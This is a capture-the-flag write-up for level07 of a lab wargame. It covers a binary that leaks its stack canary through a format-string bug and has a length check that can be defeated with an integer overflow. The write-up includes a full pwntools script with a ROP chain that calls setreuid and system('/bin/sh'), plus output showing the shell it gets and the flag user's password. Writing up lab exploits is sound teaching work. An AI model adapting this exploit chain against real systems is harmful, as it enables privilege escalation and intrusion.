## Infos on the binary

```shell
level07@rainfall:~$ checksec sprawl
[*] '/home/level07/sprawl'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Same protections as level06, there is a canary again.

In the `route_tag` function, there is a call to printf() allowing a format string breach.

```shell
void route_tag(void)

{
  char *pcVar1;
  long in_FS_OFFSET;
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("[SPRAWL] Route tag: ");
  fflush(stdout);
  pcVar1 = fgets(local_98,0x80,stdin);
  if (pcVar1 != (char *)0x0) {
    printf("[SPRAWL] Routing via ");
    printf(local_98);
    fflush(stdout);
  }
}
```

Here, the value of the canary seems to be the 23rd argument :

```shell
level07@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%p "*25)' | ./sprawl 
  [THE SPRAWL] BostonAtlantaNewYork online.
  [SPRAWL] Packet relay node v4.2
[SPRAWL] Route tag: [SPRAWL] Routing via 0x7fffffffe010 (nil) (nil) (nil) (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7fff00207025 0x1 (nil) 0x403e00 0x7ffff7ffd000 0x7fffffffe250 0x401277 (nil) `0x4ee46b7e6c2b2b00` 0x7fffffffe270 0x4016d0 
[SPRAWL] Header (hex): [SPRAWL] Invalid header.
```

Then there is a call to `read_header`, with a scanf() :

```shell
  iVar2 = read_header(&local_64);
  if (iVar2 < 0) {
    puts("[SPRAWL] Invalid header.");
  }
  else {
    ....

undefined8 read_header(int *param_1)
{
  long lVar1;
  int iVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("[SPRAWL] Header (hex): ");
  fflush(stdout);
  iVar2 = FUN_00401120("%x %hx %hx",param_1,param_1 + 1,(long)param_1 + 6);
  if (iVar2 == 3) {
    if (*param_1 == -0x21524111) {
      uVar3 = 0;
    }
....
```

We see that if there are 3 arguments read, and the param passed to read_header is equal to -0x21524111 ("0xdeadbeef"), then the function returns 0, otherwise it will return -1.

```shell
level07@rainfall:~$ ./sprawl
  [THE SPRAWL] BostonAtlantaNewYork online.
  [SPRAWL] Packet relay node v4.2
[SPRAWL] Route tag: a b c
[SPRAWL] Routing via a b c
[SPRAWL] Header (hex): deadbeef 12 3
[SPRAWL] Transmit (54 bytes): 
```
or 
```shell
level07@rainfall:~$ ./sprawl
  [THE SPRAWL] BostonAtlantaNewYork online.
  [SPRAWL] Packet relay node v4.2
[SPRAWL] Route tag: 4 5 6
[SPRAWL] Routing via 4 5 6
[SPRAWL] Header (hex): 0xdeadbeef 7 8
[SPRAWL] Transmit (56 bytes): # the transmit seems to multiply the values of 2nd an 3rd argument of the header (in hex)
```

On the `process_packet` function, if the result of `read_header` is 0, it enters :
```shell
  ushort uVar1;
  ushort uStack_60;
  short sStack_5e;
  undefined1 local_58 [72];

    uVar1 = sStack_5e * uStack_60;
    if (uVar1 < 0x41) { # 0x41 = 65
      uVar3 = (ulong)uStack_60;
      printf("[SPRAWL] Transmit (%u bytes): ",(ulong)uVar1);
      fflush(stdout);
      getchar();
      fread(local_58,1,uVar3,stdin);
      if (0x40 < uVar1) {
        uVar1 = 0x40;
      }
```

`uVar1` is the multiplication of the 2nd and 3rd arg of the header, as hex. 
(200×3277)mod65536 = 40

40 is < 65 so the program enters the if statement. Then uVar3 is set to the value of the 3rd arg, which is then used in the fread. So ew will read 200 bytes inside local58, which is 72 bytes, allowing an overflow.

```shell
[SPRAWL] Header (hex): deadbeef c8 ccd
[SPRAWL] Transmit (40 bytes): 
```

Then as previous exercises, we will use the canary value after the 72 bytes, 8 bytes of padding, the ROPchain to spawn the shell. And we need to complete the 200 bytes buffer at the end, or else it will stay in the fread

```python
from pwn import *

elf = context.binary = ELF('./sprawl')
p = process('./sprawl')

p.sendlineafter(b'[SPRAWL] Route tag: ', b'%23$p')
p.recvuntil(b'[SPRAWL] Routing via ')
rep = p.recvline().strip()
canary = int(rep, 16)
print(hex(canary))

deadbeef = b"0xdeadbeef c8 ccd"
print(deadbeef)
p.sendlineafter(b"[SPRAWL] Header (hex): ", deadbeef)

payload = b"A" * 72
payload += p64(canary)
payload += b"A" * 8
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1024)             # uid de flag07
payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
payload += p64(1024)             # uid de flag07
payload += p64(0x7ffff7d27370)   # setreuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system
payload += b"A" * (200 - len(payload))

p.sendlineafter(b'[SPRAWL] Transmit (40 bytes): ', payload)
p.interactive()
```

```shell
level07@rainfall:~$ python3 payload.py 
[*] '/home/level07/sprawl'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './sprawl': pid 2131
0x702faa70702ce900
b'0xdeadbeef c8 ccd'
[*] Switching to interactive mode
[SPRAWL] Packet 0 received. Checksum: 00000a28

$ whoami
flag07
$ cat /home/flag07/.pass
s3cgzrg5q78t6xx73ljvm3m2zfwk02ix
```
